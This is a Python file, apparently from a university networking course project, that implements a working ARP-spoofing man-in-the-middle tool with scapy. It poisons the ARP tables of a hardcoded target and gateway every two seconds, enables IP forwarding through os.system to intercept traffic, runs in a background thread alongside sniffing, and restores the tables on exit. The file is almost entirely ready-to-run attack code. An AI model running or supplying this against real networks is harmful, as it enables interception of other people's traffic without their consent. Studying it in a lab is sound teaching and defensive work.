#!/usr/bin/env python3

"""
Team Members: Aiden Jajo, Diego Lopez, Manuel Jimenez, Romel Aleman
School: San Diego State University
Course: CS576-03 - Computer Networks and Distributed Systems
Project: NetPi-Scanner

ARP spoofing implementation for man-in-the-middle network monitoring.
Enables packet interception by poisoning ARP tables of target device and gateway.
Includes functions for starting/stopping spoofing and restoring ARP tables.
"""

import scapy.all as scapy
import time
import sys
import os
import threading

# Cache MAC addresses to avoid repeated lookups
mac_cache = {}

def get_mac(ip):
    """Get MAC address for an IP, with caching and error handling"""
    # Check cache first
    if ip in mac_cache:
        return mac_cache[ip]
    
    try:
        # Create ARP request packet
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        # Send packet and get response
        answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
        
        if answered_list:
            # Extract MAC address from response
            mac = answered_list[0][1].hwsrc
            mac_cache[ip] = mac  # Cache mac
            return mac
        else:
            return None
    except Exception as e:
        print(f"\n[!] Error getting MAC for {ip}: {e}")
        return None


def spoof(target_ip, spoof_ip, target_mac):
    """Send ARP spoof packet with proper Ethernet layer"""
    # Create Ethernet header with target MAC
    ether = scapy.Ether(dst=target_mac)
    # Create ARP packet claiming to be spoof_ip
    arp = scapy.ARP(
        op=2,  # is-at (ARP reply)
        pdst=target_ip, # supply target ip and target mac for spoofing
        hwdst=target_mac,
        psrc=spoof_ip
    )
    # Combine layers and send
    packet = ether / arp
    scapy.sendp(packet, verbose=False)


def restore(destination_ip, source_ip):
    """Restore ARP tables to normal"""
    # Get legitimate MAC addresses
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    
    if not destination_mac or not source_mac:
        print(f"\n[!] Could not get MAC addresses for restoration")
        return
    
    # Create ARP packet with correct information
    ether = scapy.Ether(dst=destination_mac)
    arp = scapy.ARP(
        op=2,
        pdst=destination_ip,
        hwdst=destination_mac,
        psrc=source_ip,
        hwsrc=source_mac
    )
    packet = ether / arp
    
    # Send multiple times to ensure restoration
    scapy.sendp(packet, count=5, verbose=False)


def main():
    """Main function for standalone ARP spoofing execution"""
    target_ip = "192.168.1.160"   # Enter your target IP
    gateway_ip = "192.168.1.1"  # Enter your gateway's IP
    
    # Get MAC addresses before starting
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    
    # Verify target is reachable
    if not target_mac:
        print(f"[!] Could not get MAC for target {target_ip}")
        print("[!] Make sure the target is online and reachable")
        sys.exit(1)
    
    # Verify gateway is reachable
    if not gateway_mac:
        print(f"[!] Could not get MAC for gateway {gateway_ip}")
        print("[!] Make sure you have the correct gateway IP")
        sys.exit(1)
    
    # Display MAC addresses
    print(f"[+] Target MAC: {target_mac}")
    print(f"[+] Gateway MAC: {gateway_mac}")
    print("\n[*] Starting ARP spoofing...")
    print("[*] Press Ctrl+C to stop\n")
    
    try:
        sent_packets_count = 0
        while True:
            # Send spoof arp packet to target
            spoof(target_ip, gateway_ip, target_mac)
            
            # Spoof arp packet to gateway to make it think we are target ip
            spoof(gateway_ip, target_ip, gateway_mac)
            
            time.sleep(2)  # Wait 2 seconds between spoofs
    
    except KeyboardInterrupt:
        # Handle Ctrl+C gracefully
        print("\n\n[*] Ctrl+C pressed... Stopping")
        print("[*] Restoring ARP tables...")
        
        # Restore both ARP tables
        restore(gateway_ip, target_ip)
        restore(target_ip, gateway_ip)
        
        print("[+] ARP Spoof Stopped")
        print("[+] ARP tables restored")

# Thread for spoofing, so you can sniff and spoof at same time
_spoof_thread = None
_spoofing = False
_target_ip = None
_gateway_ip = None
_target_mac = None
_gateway_mac = None

def _spoof_loop():
    """Background spoofing loop for threaded execution"""
    global _spoofing, _target_ip, _gateway_ip, _target_mac, _gateway_mac
    while _spoofing:
        # Continuously spoof both directions
        spoof(_target_ip, _gateway_ip, _target_mac)
        spoof(_gateway_ip, _target_ip, _gateway_mac)
        time.sleep(2)

def start_arp_spoof(target_ip, gateway_ip):
    """Start ARP spoofing in background thread"""
    global _spoof_thread, _spoofing, _target_ip, _gateway_ip, _target_mac, _gateway_mac
    
    # Check if already running
    if _spoofing:
        return False, "ARP spoofing already running"
    
    # Get MACs for target and gateway
    _target_mac = get_mac(target_ip)
    _gateway_mac = get_mac(gateway_ip)
    
    # Verify both MACs were found
    if not _target_mac:
        return False, f"Could not find MAC for {target_ip}"
    if not _gateway_mac:
        return False, f"Could not find MAC for {gateway_ip}"
    
    print(f"Target MAC: {_target_mac}")
    print(f"Gateway MAC: {_gateway_mac}")
    
    # Enable IP forwarding to allow traffic to pass through
    import os
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    
    # Start spoofing in background thread
    _target_ip = target_ip
    _gateway_ip = gateway_ip
    _spoofing = True
    _spoof_thread = threading.Thread(target=_spoof_loop, daemon=True)
    _spoof_thread.start()
    
    return True, "ARP spoofing started"

def stop_arp_spoof():
    """Stop ARP spoofing and restore ARP tables"""
    global _spoofing, _spoof_thread, _target_ip, _gateway_ip
    
    # Check if spoofing is running
    if not _spoofing:
        return
    
    # Stop the spoofing thread
    _spoofing = False
    if _spoof_thread:
        _spoof_thread.join(timeout=5)
    
    # Restore ARP tables to original state
    print("Restoring ARP tables")
    restore(_gateway_ip, _target_ip)
    restore(_target_ip, _gateway_ip)
    
    # Disable IP forwarding
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    
    print("ARP spoofing stopped")



if __name__ == "__main__":
    main()
